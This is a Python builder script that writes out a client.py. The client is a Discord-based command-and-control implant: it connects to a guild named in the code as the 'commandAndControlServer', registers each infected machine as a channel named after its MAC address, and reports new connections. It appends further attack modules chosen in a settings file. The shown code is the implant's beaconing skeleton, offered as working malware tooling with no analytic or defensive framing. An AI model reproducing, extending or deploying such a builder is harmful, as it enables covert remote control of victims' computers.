import json
import os
import importlib
from datetime import datetime

# Ensure the OUTPUT directory exists with a timestamp
timestamp = datetime.now().strftime("%Y_%m_%d-%H:%M:%S")
output_dir = os.path.join(os.path.dirname(__file__), 'OUTPUT', timestamp)
os.makedirs(output_dir, exist_ok=True)

client_path = os.path.join(output_dir, 'client.py')

# Path to the settings.json file
settings_path = os.path.join(os.path.dirname(__file__), '..', '..', 'settings', 'settings.json')
print(f"[?] Settings path: {settings_path}")

print(f"[?] Client path: {client_path}")
if not os.path.exists(settings_path):
    print(f"[-] Settings file not found at {settings_path}")
    exit(1)

# Read and parse the settings.json file
print(f"[?] Reading settings from {settings_path}")
try:
    with open(settings_path, "r") as file:
        settings = json.load(file)
except json.JSONDecodeError as e:
    print(f"[-] Error parsing JSON: {e}")
    exit(1)
print(f"[+] Reading settings from {settings_path} successfully")

# Extract the modules to include
modules = settings["Modules"]

# Start building the client.py content
client_code = """
import os
import discord
import sys
from settings import guildid, bottoken
from uuid import getnode

intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)
global mac_address
mac_address = str(getnode())

async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None

@client.event
async def on_ready():
    commandAndControlServer = client.get_guild(int(guildid))
    channel = await find_channel_by_name(commandAndControlServer, mac_address)
    if channel:
        await channel.send("Connection reestablished")
    else:
        channel = await commandAndControlServer.create_text_channel(mac_address)
        e = await channel.send("New Connection established")
        await e.pin()
        await channel.send("hello world")

@client.event
async def on_message(message):
    if message.author == client.user:
        return
"""

# Dynamically import and add module-specific code
for module_name, enabled in modules.items():
    if enabled:
        module_path = f"python.components.{module_name.lower()}"
        try:
            module = importlib.import_module(module_path)
            client_code += module.get_code()
        except ModuleNotFoundError:
            print(f"[-] Module {module_name} not found at {module_path}")

# Finalize the client.py content
print("[.] Building client.py")
client_code += """
# Add more commands and functionality as needed...

client.run(bottoken)
"""
print("[+] Building client.py successful")

# Write the generated code to client.py
with open(client_path, "w") as file:
    file.write(client_code)
print("[+] writing client.py successful")

print(f"[+] client.py has been generated at {client_path}") 